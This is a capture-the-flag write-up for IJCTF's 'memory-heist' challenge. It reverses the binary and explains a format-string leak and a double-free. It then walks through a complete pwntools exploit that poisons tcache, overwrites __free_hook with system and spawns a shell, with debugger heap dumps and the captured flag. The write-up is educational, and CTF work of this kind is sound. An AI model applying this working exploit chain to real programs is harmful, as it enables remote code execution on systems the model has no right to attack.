
# Intro

So [IJCTF](https://ctftime.org/event/1382) happened recently, taking place over the weekend from the 24th of June. It had some pretty damn good challenges, and was a great way for me and the rest of [zh3r0](https://ctftime.org/team/116018) to rejuvenate after being battered by the hellhole that was google CTF. So lets get into one of these challenges.

`memory-heist` specifically was solved by my team-mate. His solution was quite baffling at first but after debugging and running through it a few times I understood. This is the exploit I will be using (and explaining) during this writeup, so I hope it can help you understand the awesome way this was exploited.

As usual, the exploit script is in the folder with this writeup (if this ends up on GitHub, anyway]). So if that's all you need, there it is.

With that out of the way, lets take a look at the challenge binary.

## Setup

... But before we can do that there is a problem. Stripped libc. If you don't mind not having access to `pwndbg`s `heap` command for looking at heap chunks, you can skip this part, but this is gonna get pretty technical so I would recommend following. You can get the debug symbols by running:

```sh
wget http://es.archive.ubuntu.com/ubuntu/pool/main/g/glibc/libc6-dbg_2.31-0ubuntu9.2_amd64.deb
```

And then

```sh
dpkg -x libc6-dbg_2.31-0ubuntu9.2_amd64.deb .
```

To extract them to the current directory. Next I used `eu-unstrip` to copy the debug symbols from the unstripped libc, over to the stripped one provided, alternatively you could just replace the libc, but I only thought of that now -_-.

```sh
eu-unstrip ./libc.so.6 usr/lib/debug/lib/x86_64-linux-gnu/libc-2.31.so -o ./libc.so.6.dbg
```

Now you should have `libc.so.6.dbg` which you can exchange with the provided libc as you wish. No need for any patching because the challenge creator's had the foresight to load the linker AND libc from the current directory. Thanks guys.

# What

First, lets see the challenge description:

`Hereee! You got both printf() and UAF. Lets see if you can get the flag :)`

Very bold... Lets see about that.

Now that we have that out of the way we can take a look at how the binary runs, and see what it does, then we can delve in with the disassembler/de-compiler of your choice. First lets run and explore some program functionality:

```
root@nomu:~/D/I/memory_heist
❯❯ ./memory-heist                                                                                                                    

Welcome to Memory Heist.

1. Allocate
2. Delete
3. Print
> 1
Enter the index for memory.
> 0
Enter the size of memory.
> 1337
Memory> asdfasdfasdf
Saved.
1. Allocate
2. Delete
3. Print
> 3
Re-visting memories comes at a cost.
Should you choose to accept to re-visit, half of your memories will be lost.
[Y/N]> Y
Index> 0
Contents:asdfasdfasdf1. Allocate
2. Delete
3. Print
>
1. Allocate
2. Delete
3. Print
> 2
Enter the index.
> 0
Done.
  [--snipped--]
fish: “./memory-heist” terminated by signal SIGALRM (Timer expired)

```

So we have 3 options: "Allocate", "Delete", and "Print". "Allocate" asks for an index, then a size, and then the contents. We can then "Print" the contents given an index. And finally we can "Delete" once done. Were also rudely interrupted by an `alarm()`, so were definitely not meant to do this manually, huh.

This looks like a pretty standard heap note challenge; we can allocate some space that we control at will, fill it with data which we also control, and then free/delete said allocation once done.

So lets take a look at our program in IDA/Ghidra to confirm or deny this hypothesis.

# Reversing
## main()

Since the binary is pretty small its feasible to walk through the binary one function at a time, so lets see what's up:

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 choice; // [rsp+8h] [rbp-8h]

  welcome();
  while ( 1 )
  {
    while ( 1 )
    {
      choice = menu(argc, argv);
      if ( choice != 3 )
        break;
      print();
    }
    if ( choice > 3 )
      break;
    if ( choice == 1 )
    {
      allocate();
    }
    else
    {
      if ( choice != 2 )
        break;
      delete();
    }
  }
  puts("Duh!");
  _exit(1);
}
```

Okay, so first we call a function `welcome()`. This is pretty simple, just give us a welcome message, and setup a semi-random `alarm()` timer:

```c
int welcome()
{
  int lol; // eax

  lol = rand();
  alarm(lol % 1337 / 20);
  return puts("\nWelcome to Memory Heist.\n");
}
```

So that's why we get kicked out almost immediately. Next we enter a command loop from which we enter our choice:

```c
while ( 1 )
{
  while ( 1 )
  {
    choice = menu(argc, argv);
    if ( choice != 3 )
      break;
    print();
  }
  if ( choice > 3 )
    break;
  if ( choice == 1 )
  {
    allocate();
  }
  else
  {
    if ( choice != 2 )
      break;
    delete();
  }
}
```

The first thing we do inside the loop is call `menu()` to display our options banner, then take said option, and return it:

```c
__int64 menu()
{
  __int64 choice[2]; // [rsp+0h] [rbp-10h] BYREF

  choice[1] = __readfsqword(0x28u);
  choice[0] = 0LL;
  puts("1. Allocate");
  puts("2. Delete");
  puts("3. Print");
  printf("> ");
  __isoc99_scanf("%lu", choice);
  return choice[0];
}
```

Back in the main command loop, we have branches for each corresponding option, and if we do not have any of these as our choice we leave the command loop and `exit()`.

Firstly, lets take a look at `allocate()`:

## allocate()

We can already see some recognizable strings:

```c
unsigned __int64 allocate()
{
  unsigned __int64 idx_dup; // rbx
  size_t nbytes; // [rsp+8h] [rbp-28h] BYREF
  unsigned __int64 idx; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 canary; // [rsp+18h] [rbp-18h]

  canary = __readfsqword(0x28u);
  nbytes = 0LL;
  idx = 0LL;
  puts("Enter the index for memory.");
  printf("> ");
  __isoc99_scanf("%lu", &idx);
  puts("Enter the size of memory.");
  printf("> ");
  __isoc99_scanf("%lu", &nbytes);
  if ( idx > 0xB || (&chunks)[idx] )
  {
    puts("Duh!");
    _exit(1);
  }
  idx_dup = idx;
  (&chunks)[idx_dup] = malloc(nbytes + 2);
  printf("Memory> ");
  nbytes = read(0, 0x4100, nbytes);
  *(&chunks + nbytes + 159) = 0;
  memcpy((&chunks)[idx], 0x4100, nbytes);       // smash &chunks + idx?
  puts("Saved.");
  return __readfsqword(0x28u) ^ canary;
}
```

So, looks like how we would expect; we enter `idx`, `nbytes` and then input contents, although the way contents is received is a little strange; first data is read from stdin into `.bss` rather than first `malloc()`ing a chunk of size `nbytes` and THEN reading data in from there. Doing it this way allows us to write as much data into `.bss` as we want, and although there's nothing interesting you could do with this its still a little strange.

Anyway, if our `idx` doesn't stray OOB, and the current slot is not occupied we are able to store our allocated memory there, our input is then read into + copied from `.bss` to our allocation after first being null terminated (I'm sort of sure that's what `*(&chunks + nbytes + 159) = 0;` is doing, anyway).

So summed up, `allocate()` does a couple things:
  - Take `idx`, `nbytes`, and chunk Contents.
  - Verify our `idx` does not go OOB and that we aren't replacing an allocation which is in use.
  - If we abide by the rules above, copy our contents into our `allocation`.

Lets move on to the next function, `print()`.

## print()

```c
unsigned __int64 print()
{
  unsigned __int64 idx1; // [rsp+8h] [rbp-28h] BYREF
  __int64 isPCT; // [rsp+10h] [rbp-20h]
  char *chr; // [rsp+18h] [rbp-18h]
  char buf[8]; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 canary; // [rsp+28h] [rbp-8h]

  canary = __readfsqword(0x28u);
  chr = 0LL;
  puts("Re-visting memories comes at a cost.");
  puts("Should you choose to accept to re-visit, half of your memories will be lost.");
  printf("[Y/N]> ");
  read(0, buf, 6uLL);
  if ( buf[0] == 'N' || buf[0] == 'n' )
  {
    puts("Thats alright.");
  }
  else
  {
    printf("Index> ");
    __isoc99_scanf("%lu", &idx1);               // idx not checked here
    chr = *(&chunks + idx1);                    // uaf here
    isPCT = 0LL;
    while ( *chr )
    {
      if ( *chr == '%' )
        isPCT = 1LL;
      if ( isPCT && *chr == 'n' )
      {
        puts("Whoaa! Whatcha doin'?");
        _exit(1);
      }
      ++chr;
    }
    printf("Contents:");
    printf(*(&chunks + idx1));                  // fmt string vuln
    for ( idx1 &= 1u; idx1 <= 0xB; idx1 += 2LL )
      *(&chunks + idx1) = 'Timaohw';
  }
  return __readfsqword(0x28u) ^ canary;
}
```

We print the all too familiar prompt, then ask for a choice, `[Y/N]`. Choosing `N`/`n` simply returns us to the command loop, but any other char will take us forward.

We read an `idx`. Interestingly enough (though not relevant for our exploit) is that said `idx` is not checked for OOB. I'm not sure if this is a feature of the challenge for not, but this allows you to specify an arbitrary `idx` which will then be printed from.

Next we get the corresponding pointer for the given `idx` and iterate through the contents of our chunk, if we give `%n` as part of our buffer during `allocate()`, we will exit the program upon detecting that (format string incoming).

After this we pass our chunk contents directly into `printf`. Here is our format string bug, like the challenge description promised - but with the constraint that no `%n` is allowed, so no writing memory using this. Like promised at the start of the program, we will now lose half of our `memories`, in this case being our chunks. The string "whoamIT" will be written to half of our chunk slots, making them effectively useless.

Once placed here, these cannot be cleared, which means we cant use these slots for any more allocations, and we certainly cant free/delete them, as we will see soon.

Anyhow, we then check the canary and are returned to our command loop, but this time with serious `amnesia`... Haha geddit? Because memories?????? Okay I'll stop.

## delete()

Finally we come to the crux of the issue, and arguably the most important function in our program. We come to the UAF:

```c
unsigned __int64 delete()
{
  unsigned __int64 v1; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v1 = 0LL;
  puts("Enter the index.");
  printf("> ");
  __isoc99_scanf("%lu", &v1);
  if ( v1 > 0xB || !*(&chunks + v1) || *free_hook )
  {
    puts("Duh!");
    _exit(1);
  }
  free(*(&chunks + v1));                        // free'd, but not cleared. ALSO not checked if freed previously
  puts("Done.");
  return __readfsqword(0x28u) ^ v2;
}
```

This function is pretty small, and all it does is validate, again that we don't go OOB, then `free()`s a chunk in a given `idx` slot. It also checks if the `__free_hook` has been overwritten, and this is something we will need to bypass later.

You may notice a couple things, and if you have props to you, because I didn't see this until very, very late in the CTF. We do not check the validity of any pointer we `free()`. This, combined with the fact that `free()`d chunks are never cleared could allow us to free a chunk twice. During the period between when it was last `free()`d we could have replaced crucial chunk metadata such as the size. This is what our exploit abuses.


With a combination of tricks with heap consolidation and `unsorted` bin chunks, we are able to write into `__free_hook`. Lets take a look at how this is achieved, shall we?

# Exploitation

So lets take a look at the script, minus the insane amount of comments I made trying to understand this, shall we?

```py
from pwn import *                                                                                                                    

binary = "./memory-heist"
#script = '''
#
#b *main-0x5f
#'''

# muh debugging
def attach_stop(p):
    gdb.attach(p)
    raw_input()

# allocate a chunk
def alloc(idx,size,data):
    p.sendlineafter('> ','1')
    p.sendlineafter('> ',str(idx))
    p.sendlineafter('> ',str(size))
    p.sendafter('Memory> ',data)

# free a chunk
def sice(idx):
    p.sendlineafter('> ','2')
    p.sendlineafter('> ', str(idx))

# view a chunk - this also wipes out half of our `chunks` array
def view(idx,kek):
    p.sendlineafter('> ','3')
    p.sendlineafter('[Y/N]> ',kek)
    p.sendlineafter('> ',str(idx))
    return p.recvline().split(b':')[1]

# start
if __name__ == "__main__":
    p = process(binary)
    #p = remote('35.244.10.136', 10253)

    alloc(1, 0x208,'AA')

    alloc(7, 0x2000,'AA')

    alloc(9, 0x100, 'AAAA')

    alloc(11, 0x100, '%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p') # leaky chunk

    sice(7)

    sice(9) # tcache

    leaks = view(11,'a').strip()
    print(leaks.split(b'0x'))
    heap_base = (int(b'0x' + leaks.split(b'0x')[8],0)&0xfffffffffffff000) - 0x2000
    pie_base = int(b'0x' + leaks.split(b'0x')[5],0) - 0x11b0
    libc_base = int(b'0x' + leaks.split(b'0x')[15],0) - 0x270b3
    print(f'Heap base: {hex(heap_base)}')
    print(f'Pie leak: {hex(pie_base)}')
    print(f'Libc base: {hex(libc_base)}')

    alloc(0, 0x500, 'AA')
    alloc(2, 0x500, 'AA')

    sice(0)
    sice(2)

    alloc(4, 0x2000, b'A'*0x508 + p64(0x111))

    sice(2)
    sice(0)

    alloc(6, 0x2000, b'A'*0x508 + p64(0x111) + p64(pie_base + 0x4060))
    alloc(8, 0x100, b'A')

    alloc(10, 0x100, p64(heap_base + 0x10) + p64(0)*11 + p64(heap_base + 0x400))

    sice(0)

    alloc(1, 0x280, b'\1'*0x80 + p64(libc_base + 0x1eeb20))

    alloc(2, 0x16, b'/bin/sh\0'+p64(libc_base + 0x55410))
    sice(2)
    p.interactive()
```

Lets walk through, step by step.

Firstly we have a set of helper functions:

```py
# muh debugging
def attach_stop(p):
    gdb.attach(p)
    raw_input()

# allocate a chunk
def alloc(idx,size,data):
    p.sendlineafter('> ','1')
    p.sendlineafter('> ',str(idx))
    p.sendlineafter('> ',str(size))
    p.sendafter('Memory> ',data)

# free a chunk
def sice(idx):
    p.sendlineafter('> ','2')
    p.sendlineafter('> ', str(idx))

# view a chunk - this also wipes out half of our `chunks` array
def view(idx,kek):
    p.sendlineafter('> ','3')
    p.sendlineafter('[Y/N]> ',kek)
    p.sendlineafter('> ',str(idx))
    return p.recvline().split(b':')[1]
```

These *primitives* are here to make it incredibly easy to perform operations on the heap of the target, we have one for each function: `alloc` for allocating chunks, `view` for printing chunk contents, and `sice`/`free` for `free()`ing chunks.

Its important to mention that due to the behavior of the `print()` function we cant use the `view` function more than once; since its already hard enough to exploit with the limited slots we have left from one call.

Firstly, we start the binary, and make 4 allocations:

```py
alloc(1, 0x208,'AA')

alloc(7, 0x2000,'AA')

alloc(9, 0x100, 'AAAA')

alloc(11, 0x100, '%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p') # leaky chunk
```

The first allocation exists only to box in allocation '7' such that it will not be consumed - if you cant already tell, '7' will be very important for our exploit to come. 7 is also an `unsorted` bin chunk when free'd, making it able to be re-used with other chunks (this fact is also very important).

 We then make another allocation in '9' which also functions as a "box" so that our chunk will not be consumed and another in '11'.

## Leaks

The chunk in '11' will be passed to `printf` in `print()` and will leak us all the pointers we need from the stack for our exploit.

We can see this here:

```py
sice(7)

sice(9) # tcache

leaks = view(11,'a').strip()
print(leaks.split(b'0x'))
heap_base = (int(b'0x' + leaks.split(b'0x')[8],0)&0xfffffffffffff000) - 0x2000
pie_base = int(b'0x' + leaks.split(b'0x')[5],0) - 0x11b0
libc_base = int(b'0x' + leaks.split(b'0x')[15],0) - 0x270b3
print(f'Heap base: {hex(heap_base)}')
print(f'Pie leak: {hex(pie_base)}')
print(f'Libc base: {hex(libc_base)}')
```

First we free idx's 7 and 9, then we `view` the chunk 11's contents and leak values from the stack, luckily we were able to leak out a heap, PIE, and libc address respectively. This is all the leaks we need.

However this has some undesirable side affects; half of our chunks have become unusable; specifically all odd indexes. This means that all chunks allocated/free'd prior to this have been cut loose; as we have no way to reference them:

Here is the `chunks` array:

```
0x55d45f1ea060 <chunks>:        0x0000000000000000      0x0054696d616f6877
0x55d45f1ea070 <chunks+16>:     0x0000000000000000      0x0054696d616f6877
0x55d45f1ea080 <chunks+32>:     0x0000000000000000      0x0054696d616f6877
0x55d45f1ea090 <chunks+48>:     0x0000000000000000      0x0054696d616f6877
0x55d45f1ea0a0 <chunks+64>:     0x0000000000000000      0x0054696d616f6877
0x55d45f1ea0b0 <chunks+80>:     0x0000000000000000      0x0054696d616f6877
```

As you can see, where our allocations used to be is the string "whoamIT".

## Feng-Shui

At this point in the program, our heap looks like this:

```
Allocated chunk | PREV_INUSE
Addr: 0x55d46019a000
Size: 0x291

Allocated chunk | PREV_INUSE <-------- chunk 1
Addr: 0x55d46019a290
Size: 0x221

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55d46019a4b0 <--------- chunk 7
Size: 0x2011
fd: 0x7f6c44c75be0
bk: 0x7f6c44c75be0

Free chunk (tcache)    <------- chunk '9'
Addr: 0x55d46019c4c0
Size: 0x110
fd: 0x00

Allocated chunk | PREV_INUSE
Addr: 0x55d46019c5d0
Size: 0x111       <------- chunk 11

Top chunk | PREV_INUSE
Addr: 0x55d46019c6e0
Size: 0x1e921

```

Here's where hk pulls out the heap ninja skills.

```py
alloc(0, 0x500, 'hk')
alloc(2, 0x500, 'hk')

sice(0)
sice(2)
```

We allocate 2 chunks, then immediately free both of them again. This has a pretty cool effect: because chunk 7 (the unsorted-bin chunk) exists and is free, `malloc()` will split parts of that chunk off for allocations 0 and 2. This looks like this, afterward:

```
Allocated chunk | PREV_INUSE
Addr: 0x557b358bb4b0
Size: 0x511

Allocated chunk | PREV_INUSE
Addr: 0x557b358bb9c0
Size: 0x511

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x557b358bbed0
Size: 0x15f1
fd: 0x7effd671dbe0
bk: 0x7effd671dbe0

```

Notice the size of the `unsorted` chunk. Some math will show you that:

```py
>>> hex(0x2010 - 0x510 - 0x510)
'0x15f0'
>>>
```

This chunk has, in fact had pieces torn off and used for allocations 0 and 2. Specifically notice the last 3 nibbles of the original chunk 7, when compared with the first new allocation. Do you see it ;).

Now when these chunks are free'd again, they are handed back to the `unsorted` chunk again:

```
Allocated chunk | PREV_INUSE
Addr: 0x558e41484000
Size: 0x291

Allocated chunk | PREV_INUSE
Addr: 0x558e41484290
Size: 0x221

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x558e414844b0
Size: 0x2011
fd: 0x7fce8c28cbe0
bk: 0x7fce8c28cbe0

Free chunk (tcache)
Addr: 0x558e414864c0
Size: 0x110
fd: 0x00

Allocated chunk | PREV_INUSE
Addr: 0x558e414865d0
Size: 0x111

Top chunk | PREV_INUSE
Addr: 0x558e414866e0
Size: 0x1e921
```

This may look exactly the same as the snapshot of the heap before, however there is one difference. Despite being free'd, we still have references to chunks 0, and 2 in our `chunks` array:

```
0x558e409ab060 <chunks>:        0x0000558e414844c0      0x0054696d616f6877
0x558e409ab070 <chunks+16>:     0x0000558e414849d0      0x0054696d616f6877
0x558e409ab080 <chunks+32>:     0x0000000000000000      0x0054696d616f6877
0x558e409ab090 <chunks+48>:     0x0000000000000000      0x0054696d616f6877
0x558e409ab0a0 <chunks+64>:     0x0000000000000000      0x0054696d616f6877
0x558e409ab0b0 <chunks+80>:     0x0000000000000000      0x0054696d616f6877
```

0 points the start of chunk 7, where it was chopped off from. And 2 points 0x500 bytes into the bigger chunk. What does this mean? Well this wouldn't normally be a problem, but since we have the ability to double-free any chunk we like, if chunk 2 LOOKED like an authentic chunk we could `free()` it again.

Since 2 points into the user-portion of the free `unsorted` chunk, if someone was to request an allocation with the size of the chunk, and then fill it with fake metadata at offset 0x500, you could make allocation 2 LOOK authentic.

This is exactly what we do next:

```py
alloc(4, 0x2000, b'A'*0x508 + p64(0x111))

sice(2)
sice(0)
```

We request an allocation that can be fulfilled by our free `unsorted` chunk, then we fill it up to 0x508 bytes deep with garbage. Then we provide a fake `size` of 0x111. This is enough to convince `free` that our chunk is valid, you can thank tcache for that :).

Now when we `free` 2, a chunk will be added to the tcache. Since 0 holds a pointer to the start of the `unsorted` chunk we can use that to `free` it again for further use.

After this point, our heap looks extremely familiar:

```
Allocated chunk | PREV_INUSE
Addr: 0x55dc4f720000
Size: 0x291

Allocated chunk | PREV_INUSE
Addr: 0x55dc4f720290
Size: 0x221

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55dc4f7204b0
Size: 0x2011
fd: 0x7f6849936be0
bk: 0x7f6849936be0

Free chunk (tcache)
Addr: 0x55dc4f7224c0
Size: 0x110
fd: 0x00

Allocated chunk | PREV_INUSE
Addr: 0x55dc4f7225d0
Size: 0x111

Top chunk | PREV_INUSE
Addr: 0x55dc4f7226e0
Size: 0x1e921
```

But in the tcache, on the top of the 0x110 bin is a chunk whos backing memory we completely control from the `unsorted` chunk:

```
tcachebins
0x110 [  2]: 0x55dc4f7209d0 —▸ 0x55dc4f7224d0 ◂— 0x0
```

The key here is that, because earlier we added chunk 9 to the tcache we now have 2 chunks on the bin, which means that if one of them happens to be consumed, the `next` ptr of that chunk will be trusted to contain a real chunk pointer, and this `next` is completely under our control.

Did you get all of that?

## Gloating

Its not too far now...

Now, we overwrite the `next` member of our tcache chunk '2':

```py
alloc(6, 0x2000, b'A'*0x508 + p64(0x111) + p64(pie_base + 0x4060))
alloc(8, 0x100, b'A')
```

Specifically, we overwrite it with the `chunks` array we also overwrite the `free_hook` copy so the check that verifies whether or not `__free_hook` has been overwritten checks a null pointer, and still believes everything is okay. This allows us to call `delete` after we overwrite `__free_hook`, and subsequently call `free()`.

Now once we consume another entry from the tcache we can see this corruption in action:

```
tcachebins
0x110 [  1]: 0x55d4de18f060 (chunks) —▸ 0x55d4e00e44c0 ◂— ...
```

The next element consumed from the tcache will now hand out an allocation that points into the `chunks` array:

```py
    alloc(10, 0x100, p64(heap_base + 0x10) + p64(0)*11 + p64(heap_base + 0x400))
```

This overwrites the entire `chunks` array:

```
                                           V idx '0' now points to the first chunk on the heap - this is where the tcache
                                             `tcache_perthread_struct` struct is stored.
    0x5577491b2060 <chunks>:        0x000055774ad5b010      0x0000000000000000
    0x5577491b2070 <chunks+16>:     0x0000000000000000      0x0000000000000000
    0x5577491b2080 <chunks+32>:     0x0000000000000000      0x0000000000000000
    0x5577491b2090 <chunks+48>:     0x0000000000000000      0x0000000000000000
    0x5577491b20a0 <chunks+64>:     0x0000000000000000      0x0000000000000000
    0x5577491b20b0 <chunks+80>:     0x0000000000000000      0x0000000000000000
    0x5577491b20c0 <free_hook>:     0x000055774ad5b400 <------ we also overwrite a copy of the __free_hook.
```

`idx` 0 now contains the allocation at the start of the heap that contains the `tcache_perthread_struct`. This is responsible for keeping all bins, and a count of how many chunks remain in each bin.

Another thing this overwrites is a copy of the `__free_hook` that came just after our `chunks`

Next, we `free` 0, this makes the `tcache_perthread_struct` chunk available, and we promptly use it and overwrite its contents:

```py
    alloc(1, 0x280, b'\1'*0x80 + p64(libc_base + 0x1eeb20))
```
We need to specify a size that is close to 0x290 - the size of the allocation to get it back, but once we do:

```
{
  counts = {257 <repeats 64 times>},
  entries = {0x7efd61112b20 <__after_morecore_hook>, 0x0 <repeats 14 times>, 0x5617bf9694c0, 0x0 <repeats 48 times>}
}
```

We overwrite every single entry inside our `counts` of our `tcache_perthread_struct` such that each bin has one chunk inside it, and this enables us to remove the `__after_morecore_hook` allocation within libc from here.

Now, at `__after_morecore_hook+8` is a bit of a surprise:

```
pwndbg> x/gx &__after_morecore_hook
0x7efd61112b20 <__after_morecore_hook>: 0x0000000000000000
pwndbg> x/gx 0x7efd61112b20+8
0x7efd61112b28 <__free_hook>:   0x0000000000000000
pwndbg>
```

As you can see, from here we are able to overwrite `__free_hook` in libc, lets see how thats done:

```py
alloc(2, 0x16, b'/bin/sh\0'+p64(libc_base + 0x55410))
# Do it xPPPP
sice(2)
p.interactive()
```

First, this will overwrite `__after_morecore_hook` with the string "/bin/sh\0" which (luckily) is exactly 8 bytes. After that we overwrite `__free_hook` with the address of `__libc_system`.

Now when we call `sice(2)` we will call `system` with our chunk 2, and since chunk 2 points directly at `__after_morecore_hook`, we will call `system("/bin/sh\0");`.

Lets test:

```
root@nomu:~/D/I/memory_heist
❯❯ python sol.py
[+] Opening connection to 35.244.10.136 on port 10253: Done
[b'', b'7ffee915e500', b'58(nil)', b'9', b'9', b'560b2b7c51b0', b'b', b'1', b'560b2d5ae605', b'a61', b'a92f19ee774b4000', b'7ffee9160bf0', b'560b2b7c58b7', b'7ffee9160ce0', b'3(nil)', b'7f062845d0b3', b'7f06286576201. Allocate']
Heap base: 0x560b2d5ac000
Pie leak: 0x560b2b7c4000
Libc base: 0x7f0628436000
[*] Switching to interactive mode
$ ls
flag
ld.so
libc.so.6
memory-heist
ynetd
$ cat flag
IJCTF{so_you_do_know_things_about_memory_heist}
$  
```

Looks like it works to me.

# Closing thoughts

No matter how good you think you are, there will always be someone better than you and in my case it was my team-mate. However by no means was my failure to solve this challenge a bad thing.

Strictly speaking, failure (especially when learning) is never really bad, as long as you can come back, learn what you did wrong and try again, until you get it. This morning I had no idea how any of this exploit worked, however now I come out of this with a keener eye, and a wider horizon than before.

That aside, there is a commented version of the exploit in the folder, and I really need to learn more heap exploitation, because you can never learn enough :).

## References
I don't usually do this, but here:

https://sourceware.org/glibc/wiki/MallocInternals

Only one ref? Yup, but its pretty damn good.
